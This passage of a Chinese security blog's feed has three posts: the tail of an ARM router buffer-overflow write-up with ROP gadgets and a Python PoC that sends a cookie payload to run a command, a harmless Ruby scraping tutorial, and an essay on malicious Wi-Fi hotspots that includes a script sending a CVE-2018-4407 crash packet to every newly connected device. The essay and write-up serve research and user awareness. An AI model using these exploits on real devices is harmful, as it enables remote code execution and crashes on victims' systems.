class="line"></span><br><span class="line"></span><br><span class="line">##4.漏洞利用</span><br><span class="line"></span><br><span class="line">![](/images/15883540111929.jpg)</span><br><span class="line">如上图所示，用checksec检查发现程序开启了NX保护，无法直接执行栈中的shellcode，我们使用ROP技术来绕过NX。</span><br><span class="line"></span><br><span class="line">大多数程序都会加载使用libc.so动态库中的函数，因此可以利用libc.so中的system函数和一些指令片断（通常称为gadget）来共同实现代码执行。需要以下信息：</span><br><span class="line">1. 将system函数地址写入某寄存器的gadget；</span><br><span class="line">2. 往R0寄存器存入内容（即system函数的参数），并跳转到system函数地址的gadget；</span><br><span class="line">3. libc.so的基地址；</span><br><span class="line">4. system函数在libc中的偏移地址；</span><br><span class="line"></span><br><span class="line">这里我们假设关闭了ASLR，libc.so基地址不会发生变化。通过gdb中执行```vmmap```查看当前libc.so的加载地址（带执行权限的那一项，注意该值在每台机器上可能都不同，我的为0xff5d5000），如下图：</span><br><span class="line">![](/images/15883546069647.jpg)</span><br><span class="line"></span><br><span class="line">system函数的偏移地址读取libc.so文件的符号表，命令为：```readelf -s ./lib/libc.so.0 | grep system```，得到0x0005a270。</span><br><span class="line">![](/images/15883546788895.jpg)</span><br><span class="line"></span><br><span class="line">接着寻找控制R0的指令片断：</span><br></pre></td></tr></table></figure></p><p>sudo pip3 install ropgadget</p><p>ROPgadget –binary ./lib/libc.so.0  | grep “mov r0, sp”<br>0x00040cb8 : mov r0, sp ; blx r3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这条指令会将栈顶写入R0，并跳转到R3寄存器中的地址。因此再找一条可以写R3的指令即可：</span><br></pre></td></tr></table></figure></p><p>ROPgadget –binary ./lib/libc.so.0 –only “pop”| grep r3<br>0x00018298 : pop {r3, pc}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">最终payload格式为：[offset, gadget1, system_addr, gadget2, cmd] ，流程如下：</span><br><span class="line">1. 溢出处函数返回跳转到第一个gadget1（pop &#123;r3, pc&#125;）；</span><br><span class="line">2. 栈顶第一个元素（system_addr）弹出到R3寄存器，第二个元素(gadget2：mov r0, sp ; blx r3&#125;)弹出到PC，使程序流执行到gadget2；</span><br><span class="line">3. 此时的栈顶内容（cmd）放入R0寄存器，并使程序跳转到R3寄存器指向的地址去执行。</span><br><span class="line"></span><br><span class="line">整理得到以下POC：</span><br></pre></td></tr></table></figure></p><p>import requests<br>from pwn import *</p><p>cmd=”echo hello”<br>libc_base = 0xff5d5000<br>system_offset = 0x0005a270<br>system_addr = libc_base + system_offset<br>gadget1 = libc_base + 0x00018298<br>gadget2 = libc_base + 0x00040cb8</p><p>#444个“A”和“.png”组成偏移量448<br>payload = “A”*444 +”.png” + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd</p><p>url = “<a href="http://192.168.2.108/goform/xxx&quot;" target="_blank" rel="noopener">http://192.168.2.108/goform/xxx&quot;</a><br>cookie = {“Cookie”:”password=”+payload}<br>requests.get(url=url, cookies=cookie)<br><code>我们可以在gadget2中将要跳转到system函数时设下断点，观察寄存器的状态。如下图所示，R0中内容为“echo hello”作为参数，R3中保存有system函数的地址，当前指令执行后将执行</code>system(“echo hello”)<code>`</code>。<br><img src="/images/15883558567931.jpg" alt="-w623"></p><p>继续运行将看到命令被执行。<br><img src="/images/15883559648985.jpg" alt="-w542"></p><p>##参考</p><ol><li><a href="https://xz.aliyun.com/t/7357" target="_blank" rel="noopener">https://xz.aliyun.com/t/7357</a></li><li><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/#&amp;gid=1&amp;pid=12" target="_blank" rel="noopener">https://wzt.ac.cn/2019/03/19/CVE-2018-5767/#&amp;gid=1&amp;pid=12</a></li><li><a href="https://www.freebuf.com/articles/wireless/166869.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/166869.html</a></li><li><a href="https://www.exploit-db.com/exploits/44253" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44253</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发于：&lt;a href=&quot;https://www.anquanke.com/post/id/204326&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/204326&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本
      
    
    </summary>
    
      <category term="技术" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ARM" scheme="http://yoursite.com/tags/arm/"/>
    
      <category term="IoT" scheme="http://yoursite.com/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>三步学会爬动态网站</title>
    <link href="http://yoursite.com/2019/crawl-dynamic/"/>
    <id>http://yoursite.com/2019/crawl-dynamic/</id>
    <published>2019-04-01T03:34:12.000Z</published>
    <updated>2020-08-29T17:51:43.332Z</updated>
    
    <content type="html"><![CDATA[<p>在我们写爬虫程序时，难免会碰到一些动态加载的网页，为获取数据制造了困难。本篇文章我将尝试用非常简短的篇幅来教大家：如何应对动态加载的网页。</p><p>以Ruby语言为例，可以在Linux、Mac、Windows等平台上进行实验。</p><h2 id="1-目标分析"><a href="#1-目标分析" class="headerlink" title="1.目标分析"></a>1.目标分析</h2><p>目标：收集目标网站上公开的所有产品型号</p><p>所有的产品通过类型进行分类，如下所示：<br><img src="/images/15540895874713.jpg" alt=""></p><p>当点击某个分类后，出现具体的产品信息：<br><img src="/images/15540895996412.jpg" alt=""><br><img src="/images/15540896080674.jpg" alt=""></p><p>需要注意的是，这部分产品信息是通过解析参数后动态加载的，这是本篇要解决的主要问题：</p><h2 id="2-Nokogiri"><a href="#2-Nokogiri" class="headerlink" title="2.Nokogiri"></a>2.Nokogiri</h2><p><a href="https://nokogiri.org/" target="_blank" rel="noopener">https://nokogiri.org/</a><br>Nokogiri是一个用于解析HTML, XML, SAX等内容的开源Ruby库，可以通过XPath和CSS选择器语法来操作内容。</p><p>安装:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install ruby</span><br><span class="line">gem install nokogiri</span><br></pre></td></tr></table></figure></p><p>通过简单分析，各分类的url位于以下结构中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul class=&quot;header-subnav-list&quot;&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;a&gt;&lt;/a&gt;</span><br><span class="line">  &lt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/15540896284049.jpg" alt=""></p><p>由于这些内容在网站中是静态的，我们直接使用open-uri打开目标网页，配合Nokogiri来获取各分类的url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#irb是Ruby的交互式shell，</span><br><span class="line">root@bad:~# irb</span><br><span class="line"></span><br><span class="line">require &apos;nokogiri&apos;</span><br><span class="line">require &apos;open-uri&apos;</span><br><span class="line"></span><br><span class="line">#获取目标网站HTML代码</span><br><span class="line">doc=Nokogiri::HTML(open(&quot;http://www.xxxx.com&quot;))</span><br><span class="line"></span><br><span class="line">#通过xpath选择器获取目标内容</span><br><span class="line">ar=doc.xpath(&quot;//ul[@class=&apos;header-subnav-list&apos;]//li//a&quot;)</span><br><span class="line"></span><br><span class="line">href = []</span><br><span class="line">ar.each &#123;|a| href &lt;&lt; a[&quot;href&quot;]&#125;</span><br></pre></td></tr></table></figure><p>查看一下获取的列表：<br><img src="/images/15540896411028.jpg" alt=""></p><p>前面提到，分类里边的产品列表由Javascript动态加载，这时候我们可以使用Watir来获取动态内容。</p><h2 id="3-Watir"><a href="#3-Watir" class="headerlink" title="3.Watir"></a>3.Watir</h2><p><a href="http://watir.com/" target="_blank" rel="noopener">http://watir.com/</a></p><p>Waitr是一个用于自动化测试的开源Ruby库。Watir将使用跟真人一样的浏览器交互方式来点击链接，填写表单和验证文本。可以配合Chrome、Firefox、IE、Safari、Edge等。</p><p>以Chrome为例，除了安装Waitr外，还需要安装chromedriver：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gem install watir</span><br><span class="line">apt install chromium-driver</span><br><span class="line"></span><br><span class="line">#其他平台可参考https://github.com/SeleniumHQ/selenium/wiki/ChromeDriver</span><br></pre></td></tr></table></figure></p><p>当我们使用Watir访问目标网站时，会出现一个受代码控制的Chrome窗口。（<strong>不要用鼠标去操作或者关掉它！！</strong>）<br><img src="/images/15540896539043.jpg" alt=""></p><p>由于浏览器加载内容需要一些时间，所以我们适当增加一些休眠时间确保内容加载完成。通过Watir获取了每个页面的内容后，再次通过nokogiri进行获取即可。</p><p><img src="/images/15540896617057.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#接着上面的代码</span><br><span class="line">require &apos;watir&apos;</span><br><span class="line"></span><br><span class="line">browser = Watir::Browser.new</span><br><span class="line">browser.goto &quot;http://www.xxxx.com#&#123;href[2]&#125;&quot;</span><br><span class="line">sleep(1)</span><br><span class="line">doc=Nokogiri::HTML(browser.html)</span><br><span class="line">ar=doc.xpath(&quot;//div[@class=&apos;product-list&apos;]//ul//li//a//div//span&quot;)</span><br><span class="line">ar.each &#123;|a| p a.content if a.content != &apos;&apos; &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/15540896722478.jpg" alt=""></p><p>可以适当输出一些中间内容，方便在出错时调试。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>请尽量通过公开数据进行练习，减缓爬取速度和数量。本篇文章仅用于教学演示，不为学员的任何非法使用进行负责。<br>（完）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在我们写爬虫程序时，难免会碰到一些动态加载的网页，为获取数据制造了困难。本篇文章我将尝试用非常简短的篇幅来教大家：如何应对动态加载的网页。&lt;/p&gt;
&lt;p&gt;以Ruby语言为例，可以在Linux、Mac、Windows等平台上进行实验。&lt;/p&gt;
&lt;h2 id=&quot;1-目标分析&quot;&gt;
      
    
    </summary>
    
      <category term="技术" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="crawl" scheme="http://yoursite.com/tags/crawl/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>有VPN保护就可以随意连接公共热点？大错特错</title>
    <link href="http://yoursite.com/2019/vpn-wifi/"/>
    <id>http://yoursite.com/2019/vpn-wifi/</id>
    <published>2019-02-14T10:34:12.000Z</published>
    <updated>2020-08-29T17:51:22.664Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/15501409832476.jpg" alt=""></p><h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><p>提到公共热点、钓鱼热点或恶意热点，我们通常会提到可能存在攻击者在嗅探网络流量中的敏感信息，或者结合DNS劫持打造一个高仿真的钓鱼环境，给用户造成安全威胁。<br><img src="/images/15501406200907.jpg" alt=""></p><p>许多安全从业者在接受采访或咨询时，会推荐在不安全的无线环境中开启VPN。目前国内许多手机应用还提供了免费的VPN功能，作为抵御恶意热点的安全解决方案来吸引用户下载安装。</p><p>然而许多产品在对外宣传描述时，存在描述过度或断章取义的情况，不自觉的去掉了限制条件，于是许多用户现在产生了这样的错觉：“只要使用VPN，就能抵御恶意热点中的一切攻击，随意连接WiFi热点也没关系了。”</p><p>随意搜了一下，在许多媒体文章中都是这个论调：</p><ul><li>“专家认为，通过VPN来连接WiFi是非常安全的。”</li><li>“用户只需在移动端开启VPN，填入用户名和密码，就可以安心的在公共WiFi网络中上网了。”</li></ul><p>这些描述都是不准确的，使用VPN的确能保护好设备的网络流量，但在恶意热点环境中的攻击威胁远不止如此。</p><p>通常，一个用户在连接公共热点时，往往通过如下步骤：</p><ol><li>打开无线功能，选择并连接到目标热点。</li><li>通常需要通过Captive Portal强制门户页面进行认证获取网络权限。</li><li>获取到网络权限后，有安全意识的用户会开启VPN保护流量。</li></ol><p>后文我将以实例说明，假设我是一名恶意热点搭建者，面对这些打算使用VPN进行保护的用户，我可以从哪些方面对他们造成威胁。</p><h2 id="2-攻击威胁"><a href="#2-攻击威胁" class="headerlink" title="2.攻击威胁"></a>2.攻击威胁</h2><h3 id="2-1-系统层面的漏洞"><a href="#2-1-系统层面的漏洞" class="headerlink" title="2.1 系统层面的漏洞"></a>2.1 系统层面的漏洞</h3><p>最具影响力的便是操作系统本身的漏洞，对没有及时更新修复漏洞的设备来说是通杀的效果。</p><h4 id="1）缓冲区溢出漏洞-CVE-2018-4407"><a href="#1）缓冲区溢出漏洞-CVE-2018-4407" class="headerlink" title="1）缓冲区溢出漏洞 CVE-2018-4407"></a>1）缓冲区溢出漏洞 CVE-2018-4407</h4><p>CVE-2018-4407是安全研究员Kevin Backhouse 发现的XNU系统内核中的堆缓冲区溢出漏洞，攻击者可能利用缓冲区溢出进行远程代码执行。由于iOS和macOS都使用XNU，因此iPhone、iPad和MacBook均受到影响。</p><p>影响范围：</p><ul><li>Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）</li><li>Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备</li><li>Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备</li><li>Apple OS X El Capitan及更早版本：所有设备</li></ul><p>Kevin在推特中给出了PoC和演示视频，利用该漏洞可以使得同一局域网下的Macbook和iPhone设备崩溃。</p><p>可以通过scapy工具来发送数据触发该漏洞:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">send(IP(dst=&quot;1.2.3.4&quot;,options=[IPOption(&quot;A&quot;*18)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))</span><br></pre></td></tr></table></figure></p><p>如果我们是一个钓鱼热点攻击者，想达到“自动”的效果很简单，定时监听当前网络活跃主机向其发送攻击代码即可。</p><p>假设使用了dnsmasq程序提供DHCP和DNS服务，dhcp池文件保存在‘/var/lib/misc/dnsmasq.leases’文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os, time</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">lines_old = 0</span><br><span class="line">lines_new = 0</span><br><span class="line">while 1:</span><br><span class="line">    lines_old = lines_new</span><br><span class="line">    if os.path.exists(&apos;/var/lib/misc/dnsmasq.leases&apos;):</span><br><span class="line">        f = open(&apos;/var/lib/misc/dnsmasq.leases&apos;, &apos;r&apos;).readlines()</span><br><span class="line">        lines_new = len(f)</span><br><span class="line">        if lines_new &gt; lines_old:</span><br><span class="line">            for i in range(lines_old, lines_new):</span><br><span class="line">                value = f[i].split()</span><br><span class="line">                if len(value) == 5:</span><br><span class="line">                    print value[2] + &apos; &apos; + value[1] + &apos; &apos; + value[3] + &apos; Connect!&apos;</span><br><span class="line">                    </span><br><span class="line">                    for i in range(3):</span><br><span class="line">                        #For Apple devices(CVE-2018-4407)</span><br><span class="line">                        send(IP(dst=value[2],options=[IPOption(&quot;A&quot;*18)])/TCP(dport=2323,options=[(19, &quot;1&quot;*18),(19, &quot;2&quot;*18)]))                </span><br><span class="line">                        time.sleep(1)</span><br><span class="line">    time.sleep(3)</span><br></pre></td></tr></table></figure><p>该段代码的作用是：每3秒读取一次dhcp文件，如果发现新的主机，生成exploit发向该设备。</p><p>如果这些苹果设备没有及时更新到漏洞修复的版本，就会出现如下图所示的崩溃效果：</p><p><img src="/images/15501406577358.jpg" alt=""></p><h4 id="2）永恒之蓝"><a href="#2）永恒之蓝" class="headerlink" title="2）永恒之蓝"></a>2）永恒之蓝</h4><p>永恒之蓝（EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织Shadow Brokers泄漏。该工具利用TCP445 port上的文件共享协议漏洞进行散播。</p><p>尽管微软于2017年3月14日发布操作系统补丁修补了这个漏洞，5月12日WannaCry勒索软件利用这个漏洞传播时，很多Windows用户仍然没有安装补丁，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p><p>永恒之蓝大家都很熟悉，就不继续详细说明了。对于热点网络中没有修复漏洞的Windows设备，我们已经可以获取到系统最高权限。</p><h3 id="2-2-软件应用上的漏洞"><a href="#2-2-软件应用上的漏洞" class="headerlink" title="2.2 软件应用上的漏洞"></a>2.2 软件应用上的漏洞</h3><p>除了操作系统本身外，我们安装的各类软件应用会开放一些服务，如果它们存在安全缺陷也会成为一个攻击点，比如前两天爆出的ES文件管理器的安全问题。</p><p>研究人员发现ES文件管理器启动后会创建本地HTTP服务器，在其所有后台服务被结束前该服务器始终开启，处于相同网络的任意用户可直接向安装 ES 管理器的设备发起攻击。</p><p><img src="/images/15501406782435.jpg" alt=""></p><p>所以，当连入恶意热点的Android客户端后台开启了含有漏洞的ES文件浏览器时，我们甚至可以直接从设备上获取照片、视频、文档了。</p><blockquote><p>顺便提一句，官方已经完成修复并上架应用市场，Android用户看到这记得升级一下。<br><img src="/images/15501406874750.jpg" alt=""></p></blockquote><h3 id="2-3-利用Captive-Portal进行钓鱼"><a href="#2-3-利用Captive-Portal进行钓鱼" class="headerlink" title="2.3 利用Captive Portal进行钓鱼"></a>2.3 利用Captive Portal进行钓鱼</h3><p>如果无线客户端本身不存在漏洞，我们还可以利用Captive Portal来进行一些攻击。</p><p>前面提到用户在开启VPN前，需要经过Captive Portal强制门户的认证，大部分无线设备都会自动出来一个弹窗，如下图所示。</p><p><img src="/images/15501406959850.jpg" alt=""></p><p>在打开的网页中，通常通过账号密码、手机验证码、微信认证等形式进行认证来开通网络权限，否者是没网的。</p><p>攻击者同样可以在恶意热点上实现Captive Portal认证，并自定义Portal主页对用户进行欺骗钓鱼，比如假言需要在表单中填入个人信息来换取免费使用网络，如下图所示。</p><p><img src="/images/15501407098749.jpg" alt=""></p><p>简单来说，这利用了在开启VPN前，需要通过Portal页面开通网络权限的间歇进行了钓鱼攻击。</p><h3 id="2-4-进一步利用Portal"><a href="#2-4-进一步利用Portal" class="headerlink" title="2.4 进一步利用Portal"></a>2.4 进一步利用Portal</h3><p>在Pwn2own 2018上，有许多通过浏览器发起的攻击都利用到了WiFi Captive Portal的特性进行自动触发。</p><p><img src="/images/15501407201466.jpg" alt=""></p><p>我们来仔细看看这个Portal浏览器，它与正常的系统浏览器是不一样的，出于安全考虑它并没有包含所有功能，比如Cookie、下载等功能都被限制了，但在部分手机系统上是支持URL Scheme的。</p><p><code>&lt;scheme&gt;://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;?&lt;query&gt;</code></p><p>URL Scheme是iOS和Android提供给开发者的一种APP跳转方式。Android应用在Mainfest中注册自己的Scheme，iOS应用在APP属性中配置。配置完成后，就可以通过url的形式唤醒APP。比如可以利用这个技术，在Portal浏览器中调用微信进行认证。</p><p>后来我认真想了想，怎么滥用这个特性。</p><ol><li><p>连接WiFi自动打开商品淘宝页<br><img src="/images/portal_taobao.gif" alt="portal_taobao"></p></li><li><p>2019最新乞讨方式<br><img src="/images/portal_alipay.gif" alt="portal_alipay"></p></li></ol><p>后来发现三星已经发现并修复了这个利用Captive Portal自动重定向到第三方应用的问题（SVE-2018-13474）。<br><img src="/images/15501407715504.jpg" alt=""></p><p>我就想着给自己用来测试的miui也提一个，正好他们也有SRC。结果被忽略了，因为他们觉得不属于miui的问题。</p><p><img src="/images/15501407791566.jpg" alt=""></p><p>好吧。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>虽然我们的终端设备通常不会直接暴露在互联网上遭到攻击，但很难确保在各类无线网络中是否存在潜藏着的攻击者。</p><p>这篇文章想表达三个重点：</p><ol><li>VPN并不是公共热点的万能保护福，它能保护网络流量，但还可能遭到其他形式的攻击。</li><li>请对所有热点采取默认不信任态度，尽量不连接公共热点。</li><li>及时进行系统、软件的更新，确保对各类安全缺陷的修复。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/15501409832476.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-背景&quot;&gt;&lt;a href=&quot;#1-背景&quot; class=&quot;headerlink&quot; title=&quot;1. 背景&quot;&gt;&lt;/a&gt;1. 背景&lt;/h2&gt;&lt;p&gt;提到公共热点、
      
    
    </summary>
    
      <category term="技术" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="WiFi" scheme="http://yoursite.com/tags/wifi/"/>
    
      <category term="VPN" scheme="http://yoursite.com/tags/vpn/"/>
    
  </entry>
  
</feed>
